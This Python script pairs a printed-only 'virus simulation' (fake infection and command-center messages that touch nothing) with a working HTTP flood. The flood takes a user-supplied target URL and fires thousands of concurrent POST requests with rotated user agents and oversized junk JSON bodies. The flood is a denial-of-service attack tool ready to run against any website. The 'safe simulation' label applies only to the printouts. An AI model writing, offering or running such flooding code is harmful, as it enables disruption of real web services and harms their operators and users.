import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
import requests
import sys

# ANSI colors for green hacker style
GREEN = "\033[92m"
RESET = "\033[0m"

# -----------------------
# User Input
# -----------------------
target_url = input(f"{GREEN}Enter target URL: {RESET}").strip()
requests_to_send = int(input(f"{GREEN}Enter number of requests: {RESET}").strip() or 10000)
max_workers = int(input(f"{GREEN}Enter max workers: {RESET}").strip() or 300)
visible_logs = 100

user_agents = [
    "Mozilla/5.0 (Linux; Android 11; Mobile)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)",
]

fake_payload = {
    "username": "admin" * 1000,
    "password": "pass123" * 1000,
    "data": "X" * 10000
}

# -----------------------
# Web request sender
# -----------------------
def send_post(i):
    try:
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/json"
        }
        response = requests.post(target_url, json=fake_payload, headers=headers, timeout=5)
        if i < visible_logs:
            print(f"{GREEN}[{i+1}] Status: {response.status_code}{RESET}")
    except requests.RequestException as e:
        if i < visible_logs:
            print(f"{GREEN}[{i+1}] ❌ Request failed: {e}{RESET}")

# -----------------------
# Fake virus simulator (safe)
# -----------------------
def generate_payload():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=100))

def infect_file(file_path):
    print(f"{GREEN}[SIMULATION] Infecting file: {file_path}{RESET}")
    payload = generate_payload()
    print(f"{GREEN}[SIMULATION] Writing fake payload to {file_path} (NOT ACTUALLY WRITTEN){RESET}")

def scan_and_infect():
    fake_files = [f"file_{i}.txt" for i in range(5)]
    for f in fake_files:
        infect_file(f)
        time.sleep(0.1)

def connect_to_command_center():
    print(f"{GREEN}[SIMULATION] Connecting to attacker server... (no real connection){RESET}")

# -----------------------
# Main runner
# -----------------------
def main():
    print(f"{GREEN}[SIMULATION] Virus started.{RESET}")
    connect_to_command_center()
    scan_and_infect()
    print(f"{GREEN}[SIMULATION] Virus finished.{RESET}")

    print(f"\n{GREEN}🚀 Sending {requests_to_send} requests to {target_url} (only showing first {visible_logs} logs)...{RESET}")  
    start = time.time()  

    with ThreadPoolExecutor(max_workers=max_workers) as executor:  
        for i in range(requests_to_send):  
            executor.submit(send_post, i)  

    duration = round(time.time() - start, 2)  
    print(f"\n{GREEN}✅ Done sending {requests_to_send} requests in {duration} seconds.{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(f"\n{GREEN}⚠ Stopped by user.{RESET}")
